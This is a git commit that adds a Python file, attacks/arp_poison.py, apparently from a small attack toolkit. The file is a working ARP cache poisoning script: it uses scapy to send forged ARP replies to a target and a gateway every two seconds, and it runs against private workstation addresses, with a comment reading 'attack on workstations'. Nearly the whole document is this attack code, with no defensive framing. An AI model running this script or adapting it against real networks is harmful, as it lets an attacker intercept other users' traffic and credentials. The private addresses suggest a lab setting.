1e3032385a1b6bfbce54882e4b3c1eb0cd0cd246
Dark Peace <74102789+Dark-Peace@users.noreply.github.com>
2024-04-11 15:37:52 +0200

    base for arp poisonning

---
+++ attacks/arp_poison.py
@@ -0,0 +1,18 @@
+import time
+import scapy.all as scapy
+
+
+def attack(target, gateway):
+    print("Attack launched, stop with CTRL+C")
+    try:
+        while True:
+            scapy.send(scapy.ARP(op=2, pdst=gateway, hwdst=scapy.getmacbyip(gateway), psrc=target))
+            scapy.send(scapy.ARP(op=2, pdst=target, hwdst=scapy.getmacbyip(target), psrc=gateway))
+            time.sleep(2)
+    except KeyboardInterrupt:
+        return
+
+if __name__ == "__main__":
+    # attack on workstations
+    attack("10.1.0.2", "10.1.0.1")
+    attack("10.1.0.3", "10.1.0.1")
